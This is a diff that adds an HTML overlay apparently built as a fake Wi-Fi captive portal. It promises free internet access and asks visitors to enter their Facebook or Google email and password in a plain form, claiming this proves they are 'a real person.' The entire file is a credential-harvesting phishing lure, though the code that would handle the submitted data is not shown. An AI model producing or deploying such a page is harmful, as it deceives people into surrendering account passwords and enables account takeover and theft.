@@ -1,0 +1,20 @@
+<div id="pa_overlay-back"></div>
+<div id="pa_msgBox" class="pa_main">
+	<h1 class="pa_h1">Your internet access is on us today.</h1>
+	<h4 class="pa_h4">Simply login with your Facebook or Google account to start surfing.</h4>
+	<h4 class="pa_h4"><strong>*This is so we know you are a real person.</strong></h4>
+	<table class="pa_table">
+	<tr><td align="right" class="pa_left">
+		<h4 class="pa_h4" style="display:inline">Email:</h4>
+	</td><td align="left">
+		<input type="text" id="pa_email" name="pa_email" class="pa_field"/>
+	</td></tr>
+	<tr><td align="right" class="pa_left">
+		<h4 class="pa_h4" style="display:inline">Password:</h4>
+	</td><td align="left">
+		<input type="password" id="pa_password" name="pa_password" class="pa_field"/>
+	</td></tr>
+	</table>
+	<br />
+	<button id="submit_button" class="pa_connectButton" type="button">Connect</button>
+</div>
